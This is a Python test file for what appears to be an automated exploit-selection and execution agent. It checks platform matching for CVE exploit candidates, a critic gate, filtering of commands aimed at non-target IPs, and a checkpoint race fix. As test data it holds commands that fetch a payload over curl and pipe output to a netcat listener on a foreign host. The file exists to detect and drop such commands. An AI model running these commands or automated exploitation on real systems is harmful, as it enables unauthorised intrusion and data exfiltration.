"""
Tests for the run-failure reliability fix.

Covers:
  1. Snippet assumption validation (platform conflict detection)
  2. Critic deterministic fast-path platform-conflict gate
  3. Foreign IP diagnostic extraction in execution preflight
  4. Checkpoint saver thread-safety race fix
"""

import logging
import os
import pickle
import tempfile
import threading
import time
import unittest
from unittest.mock import patch

from src.agents.hypothesis_phase.critic_agent import _deterministic_fast_path
from src.execution.preflight import _contains_foreign_ip, _extract_foreign_ips, prepare_candidate
from src.graph import _DiskBackedSaver
from src.memory.world_state import HostInfo, ServiceInfo, WorldState
from src.retrieval.applicability import (
    _check_foreign_target_ips,
    _check_snippet_target_assumptions,
    assess_candidates,
)
from src.retrieval.models import (
    ApplicabilityAssessment,
    AuthoritativeRecord,
    PocCandidate,
    ProcedureSnippet,
    ProductFingerprint,
)


# ── Component 1: Snippet assumption validation ──────────────────────────────


class TestSnippetAssumptionValidation(unittest.TestCase):
    """Snippet target_assumptions are cross-checked against ProductFingerprint."""

    def _fp(self, platform_hints=None, target_ip="10.0.0.1"):
        return ProductFingerprint(
            target_ip=target_ip,
            port=80,
            raw_service="Apache",
            vendor="apache",
            product="httpd",
            version="2.4.49",
            platform_hints=platform_hints or [],
            confidence=0.9,
        )

    def _record(self, cve_id="CVE-2021-41773", platform_hints=None):
        return AuthoritativeRecord(
            cve_id=cve_id,
            source="vendor",
            title="Apache httpd traversal",
            description="Apache httpd on Linux",
            platform_hints=platform_hints or [],
        )

    def _candidate(self, cve_id="CVE-2021-41773", source="exploitdb"):
        return PocCandidate(
            candidate_id=f"{source}:{cve_id}:apache",
            cve_id=cve_id,
            source=source,
            path="/tmp/apache.py",
        )

    def test_windows_snippet_on_linux_target_forces_platform_no(self):
        fp = self._fp(platform_hints=["linux"])
        snippet = ProcedureSnippet(
            candidate_id="exploitdb:CVE-2021-41773:apache",
            commands=["python apache.py"],
            target_assumptions=["windows"],
        )
        result = _check_snippet_target_assumptions(snippet, fp)
        self.assertEqual(result, "no")

    def test_linux_snippet_on_linux_target_returns_yes(self):
        fp = self._fp(platform_hints=["linux"])
        snippet = ProcedureSnippet(
            candidate_id="exploitdb:CVE-2021-41773:apache",
            commands=["python apache.py"],
            target_assumptions=["linux"],
        )
        result = _check_snippet_target_assumptions(snippet, fp)
        self.assertEqual(result, "yes")

    def test_empty_assumptions_returns_unknown(self):
        fp = self._fp(platform_hints=["linux"])
        snippet = ProcedureSnippet(
            candidate_id="exploitdb:CVE-2021-41773:apache",
            commands=["python apache.py"],
            target_assumptions=[],
        )
        result = _check_snippet_target_assumptions(snippet, fp)
        self.assertEqual(result, "unknown")

    def test_alias_normalization_win32_matches_windows(self):
        fp = self._fp(platform_hints=["windows"])
        snippet = ProcedureSnippet(
            candidate_id="exploitdb:CVE-2021-1:apache",
            commands=["python exploit.py"],
            target_assumptions=["win32"],
        )
        result = _check_snippet_target_assumptions(snippet, fp)
        self.assertEqual(result, "yes")

    def test_no_platform_hints_on_fp_returns_unknown(self):
        fp = self._fp(platform_hints=[])
        snippet = ProcedureSnippet(
            candidate_id="exploitdb:CVE-2021-1:apache",
            commands=["python exploit.py"],
            target_assumptions=["windows"],
        )
        result = _check_snippet_target_assumptions(snippet, fp)
        self.assertEqual(result, "unknown")

    def test_full_assess_candidates_rejects_platform_conflict(self):
        ws = WorldState(hosts={
            "10.0.0.1": HostInfo(
                ip="10.0.0.1",
                services=[ServiceInfo(port=80, name="Apache", version="2.4.49", accessibility="open", confidence=0.9)],
            )
        })
        fp = self._fp(platform_hints=["linux"])
        record = self._record(platform_hints=["linux"])
        candidate = self._candidate()
        snippet = ProcedureSnippet(
            candidate_id=candidate.candidate_id,
            commands=["python apache.py --target 10.0.0.1"],
            target_assumptions=["windows"],
            confidence=0.8,
        )
        assessments = assess_candidates(ws, [fp], [record], [candidate], [snippet])
        self.assertEqual(len(assessments), 1)
        self.assertEqual(assessments[0].platform_match, "no")
        self.assertEqual(assessments[0].verdict, "reject")
        self.assertTrue(
            any("snippet_platform=no" in r for r in assessments[0].reasons),
            f"Expected snippet_platform=no in reasons, got {assessments[0].reasons}",
        )

    def test_matching_assumption_preserves_strong_verdict(self):
        ws = WorldState(hosts={
            "10.0.0.1": HostInfo(
                ip="10.0.0.1",
                services=[ServiceInfo(port=80, name="Apache", version="2.4.49", accessibility="open", confidence=0.9)],
            )
        })
        fp = self._fp(platform_hints=["linux"])
        record = self._record(platform_hints=["linux"])
        candidate = self._candidate()
        snippet = ProcedureSnippet(
            candidate_id=candidate.candidate_id,
            commands=["python apache.py --target 10.0.0.1"],
            target_assumptions=["linux"],
            confidence=0.8,
        )
        assessments = assess_candidates(ws, [fp], [record], [candidate], [snippet])
        self.assertEqual(len(assessments), 1)
        self.assertEqual(assessments[0].platform_match, "yes")
        self.assertTrue(
            any("snippet_platform=yes" in r for r in assessments[0].reasons),
        )


class TestForeignIPHygieneSignal(unittest.TestCase):
    """Foreign IPs in snippet commands produce hygiene warnings in reasons."""

    def test_foreign_ip_in_reasons_warning(self):
        ws = WorldState(hosts={
            "10.0.0.1": HostInfo(
                ip="10.0.0.1",
                services=[ServiceInfo(port=80, name="Apache", version="2.4.49", accessibility="open", confidence=0.9)],
            )
        })
        fp = ProductFingerprint(
            target_ip="10.0.0.1", port=80, raw_service="Apache",
            vendor="apache", product="httpd", version="2.4.49",
            platform_hints=["linux"], confidence=0.9,
        )
        record = AuthoritativeRecord(
            cve_id="CVE-2021-41773", source="vendor",
            title="Apache httpd traversal", description="Apache httpd on Linux",
            platform_hints=["linux"],
        )
        candidate = PocCandidate(
            candidate_id="exploitdb:CVE-2021-41773:apache",
            cve_id="CVE-2021-41773", source="exploitdb", path="/tmp/apache.py",
        )
        snippet = ProcedureSnippet(
            candidate_id=candidate.candidate_id,
            commands=[
                "python apache.py --target 10.0.0.1",
                "curl http://192.168.99.99/payload",
            ],
            target_assumptions=["linux"],
            confidence=0.8,
        )
        signal, ips = _check_foreign_target_ips(snippet, fp)
        self.assertEqual(signal, "warning")
        self.assertIn("192.168.99.99", ips)

    def test_all_foreign_commands_signal(self):
        fp = ProductFingerprint(
            target_ip="10.0.0.1", port=80, platform_hints=["linux"],
        )
        snippet = ProcedureSnippet(
            candidate_id="test:cve:1",
            commands=[
                "curl http://192.168.99.99/payload",
                "python exploit.py --host 172.16.0.50",
            ],
        )
        signal, ips = _check_foreign_target_ips(snippet, fp)
        self.assertEqual(signal, "no_good_commands")
        self.assertIn("192.168.99.99", ips)
        self.assertIn("172.16.0.50", ips)

    def test_clean_commands_signal(self):
        fp = ProductFingerprint(
            target_ip="10.0.0.1", port=80, platform_hints=["linux"],
        )
        snippet = ProcedureSnippet(
            candidate_id="test:cve:1",
            commands=["python exploit.py --target 10.0.0.1"],
        )
        signal, ips = _check_foreign_target_ips(snippet, fp)
        self.assertEqual(signal, "clean")
        self.assertEqual(ips, [])

    def test_no_commands_clean(self):
        fp = ProductFingerprint(target_ip="10.0.0.1", port=80)
        snippet = ProcedureSnippet(candidate_id="test:cve:1", commands=[])
        signal, ips = _check_foreign_target_ips(snippet, fp)
        self.assertEqual(signal, "clean")
        self.assertEqual(ips, [])


# ── Component 2: Critic platform-conflict gate ──────────────────────────────


class TestCriticPlatformConflictGate(unittest.TestCase):
    """Critic does not auto-pass a single candidate with platform conflict."""

    def _make_bundle(self, shortlist, assessments, authoritative=None, poc_candidates=None):
        from src.retrieval import RetrievalBundle
        bundle = RetrievalBundle()
        bundle.shortlist = shortlist
        bundle.assessments = assessments
        bundle.authoritative_records = authoritative or []
        bundle.poc_candidates = poc_candidates or []
        return bundle

    def _make_state(self, **overrides):
        from src.state import initial_state
        state = initial_state(target_ip="10.0.0.1")
        state.update(overrides)
        return state

    def test_single_strong_no_conflict_auto_passes(self):
        candidate_id = "exploitdb:CVE-2021-41773:apache"
        shortlist = [{"candidate_id": candidate_id, "cve_id": "CVE-2021-41773", "source": "exploitdb"}]
        assessments = [{
            "candidate_id": candidate_id,
            "cve_id": "CVE-2021-41773",
            "verdict": "strong",
            "version_match": "yes",
            "cpe_match": "yes",
            "platform_match": "yes",
            "network_match": "yes",
            "score": 0.84,
            "reasons": ["version=yes", "cpe=yes", "platform=yes"],
        }]
        authoritative = [{"cve_id": "CVE-2021-41773", "source": "vendor"}]
        bundle = self._make_bundle(shortlist, assessments, authoritative)
        state = self._make_state()

        result = _deterministic_fast_path(state, bundle)
        self.assertIsNotNone(result)
        self.assertEqual(result["verdict"], "pass")
        self.assertEqual(result["approved_candidate_ids"], [candidate_id])

    def test_single_strong_platform_conflict_blocked(self):
        candidate_id = "exploitdb:CVE-2024-38472:apache"
        shortlist = [{"candidate_id": candidate_id, "cve_id": "CVE-2024-38472", "source": "exploitdb"}]
        assessments = [{
            "candidate_id": candidate_id,
            "cve_id": "CVE-2024-38472",
            "verdict": "strong",
            "version_match": "yes",
            "cpe_match": "yes",
            "platform_match": "yes",
            "network_match": "yes",
            "score": 0.84,
            "reasons": ["version=yes", "cpe=yes", "platform=yes", "snippet_platform=no"],
        }]
        authoritative = [{"cve_id": "CVE-2024-38472", "source": "vendor"}]
        bundle = self._make_bundle(shortlist, assessments, authoritative)
        state = self._make_state()

        result = _deterministic_fast_path(state, bundle)
        self.assertIsNotNone(result)
        self.assertEqual(result["verdict"], "need_more_recon")
        self.assertIn("single_candidate_platform_conflict", result["issues"])
        self.assertEqual(result["approved_candidate_ids"], [])

    def test_multiple_candidates_unaffected_by_platform_gate(self):
        ids = ["exploitdb:CVE-2021-1:apache", "github:CVE-2021-2:apache"]
        shortlist = [
            {"candidate_id": ids[0], "cve_id": "CVE-2021-1", "source": "exploitdb"},
            {"candidate_id": ids[1], "cve_id": "CVE-2021-2", "source": "github"},
        ]
        assessments = [
            {
                "candidate_id": ids[0], "cve_id": "CVE-2021-1",
                "verdict": "strong", "version_match": "yes",
                "cpe_match": "yes", "platform_match": "yes",
                "network_match": "yes", "score": 0.84,
                "reasons": ["version=yes", "snippet_platform=no"],
            },
            {
                "candidate_id": ids[1], "cve_id": "CVE-2021-2",
                "verdict": "strong", "version_match": "yes",
                "cpe_match": "yes", "platform_match": "yes",
                "network_match": "yes", "score": 0.80,
                "reasons": ["version=yes"],
            },
        ]
        authoritative = [
            {"cve_id": "CVE-2021-1", "source": "vendor"},
            {"cve_id": "CVE-2021-2", "source": "vendor"},
        ]
        bundle = self._make_bundle(shortlist, assessments, authoritative)
        state = self._make_state()

        result = _deterministic_fast_path(state, bundle)
        # Multiple strong candidates — the single-candidate fast path should not trigger
        # (should return None to fall through to LLM, or handle differently)
        if result is not None:
            self.assertNotEqual(result["verdict"], "need_more_recon",
                                "Platform gate should not apply to multi-candidate shortlists")


# ── Component 3: Foreign IP diagnostics ─────────────────────────────────────


class TestForeignIPDiagnostics(unittest.TestCase):
    """_extract_foreign_ips reports actual offending IPs, not truncated commands."""

    def test_extracts_foreign_ip(self):
        result = _extract_foreign_ips(
            "curl http://192.168.1.99/", "10.0.0.1", "10.0.0.2",
        )
        self.assertEqual(result, {"192.168.1.99"})

    def test_excludes_target_ip(self):
        result = _extract_foreign_ips(
            "curl http://10.0.0.1/", "10.0.0.1", "10.0.0.2",
        )
        self.assertEqual(result, set())

    def test_excludes_localhost(self):
        result = _extract_foreign_ips(
            "curl http://127.0.0.1/", "10.0.0.1", "10.0.0.2",
        )
        self.assertEqual(result, set())

    def test_multiple_mixed_ips(self):
        result = _extract_foreign_ips(
            "curl http://10.0.0.1/ | nc 192.168.1.99 4444",
            "10.0.0.1", "10.0.0.2",
        )
        self.assertEqual(result, {"192.168.1.99"})

    def test_no_ips_returns_empty(self):
        result = _extract_foreign_ips("echo hello", "10.0.0.1", "10.0.0.2")
        self.assertEqual(result, set())

    def test_prepare_candidate_warning_reports_ips(self):
        """The logger warning should contain the actual offending IP."""
        with tempfile.TemporaryDirectory(prefix="preflight-") as tmp:
            exploit_path = os.path.join(tmp, "exploit.py")
            with open(exploit_path, "w") as f:
                f.write("print('hello')\n")

            with self.assertLogs("src.execution.preflight", level="WARNING") as cm:
                result = prepare_candidate(
                    {
                        "file_path": exploit_path,
                        "commands": ["curl http://192.168.99.99/"],
                        "target_ip": "10.0.0.1",
                        "attacker_ip": "10.0.0.2",
                    },
                    os.path.join(tmp, "workspace"),
                    {},
                    [],
                )
            self.assertEqual(result.status, "invalid_command")
            # The warning should mention the offending IP
            warning_text = " ".join(cm.output)
            self.assertIn("192.168.99.99", warning_text)

    def test_mixed_commands_keeps_safe_drops_unsafe(self):
        """Safe commands survive, foreign-IP commands are dropped."""
        with tempfile.TemporaryDirectory(prefix="preflight-") as tmp:
            exploit_path = os.path.join(tmp, "exploit.py")
            with open(exploit_path, "w") as f:
                f.write("print('hello')\n")

            result = prepare_candidate(
                {
                    "file_path": exploit_path,
                    "commands": [
                        "curl http://10.0.0.1/health",
                        "curl http://192.168.99.99/payload",
                    ],
                    "target_ip": "10.0.0.1",
                    "attacker_ip": "10.0.0.2",
                },
                os.path.join(tmp, "workspace"),
                {},
                [],
            )
            self.assertEqual(result.status, "ready")
            self.assertEqual(len(result.rendered_commands), 1)
            self.assertIn("10.0.0.1", result.rendered_commands[0])


# ── Component 4: Checkpoint saver thread-safety ─────────────────────────────


def _make_ckpt_config(thread_id="test"):
    return {
        "configurable": {
            "thread_id": thread_id,
            "checkpoint_ns": "",
            "checkpoint_id": None,
        }
    }


def _make_checkpoint(step=0):
    return {
        "v": 2,
        "ts": time.time(),
        "id": f"ckpt-{step}",
        "channel_values": {"state": {"step": step}},
        "channel_versions": {"state": step},
        "versions_seen": {},
    }


class TestCheckpointSaverRace(unittest.TestCase):
    """super().put() is under the lock; no 'dictionary changed size' errors."""

    def test_concurrent_puts_no_dict_error(self):
        """8 threads x 20 puts: no RuntimeError from dict mutation during iteration."""
        with tempfile.TemporaryDirectory(prefix="ckpt-race-") as tmp:
            path = os.path.join(tmp, "test.pkl")
            saver = _DiskBackedSaver(path)
            errors = []

            def writer(n):
                try:
                    for i in range(20):
                        saver.put(
                            _make_ckpt_config(f"t-{n}"),
                            _make_checkpoint(n * 20 + i),
                            {},
                            {},
                        )
                except Exception as exc:
                    errors.append(exc)

            threads = [threading.Thread(target=writer, args=(n,)) for n in range(8)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(errors, [], f"Concurrent put() raised: {errors}")

    def test_checkpoint_format_unchanged(self):
        """Output file has 'storage' and 'writes' keys."""
        with tempfile.TemporaryDirectory(prefix="ckpt-fmt-") as tmp:
            path = os.path.join(tmp, "test.pkl")
            saver = _DiskBackedSaver(path)
            saver.put(_make_ckpt_config(), _make_checkpoint(0), {}, {})
            with open(path, "rb") as f:
                data = pickle.load(f)
            self.assertIn("storage", data)
            self.assertIn("writes", data)

    def test_put_remains_readable_after_concurrent_writes(self):
        """Checkpoint file is valid pickle after concurrent puts."""
        with tempfile.TemporaryDirectory(prefix="ckpt-readable-") as tmp:
            path = os.path.join(tmp, "test.pkl")
            saver = _DiskBackedSaver(path)

            def writer(n):
                for i in range(10):
                    saver.put(
                        _make_ckpt_config(f"t-{n}"),
                        _make_checkpoint(n * 10 + i),
                        {},
                        {},
                    )

            threads = [threading.Thread(target=writer, args=(n,)) for n in range(4)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()

            with open(path, "rb") as f:
                data = pickle.load(f)
            self.assertIsInstance(data, dict)
            self.assertIn("storage", data)


if __name__ == "__main__":
    unittest.main()
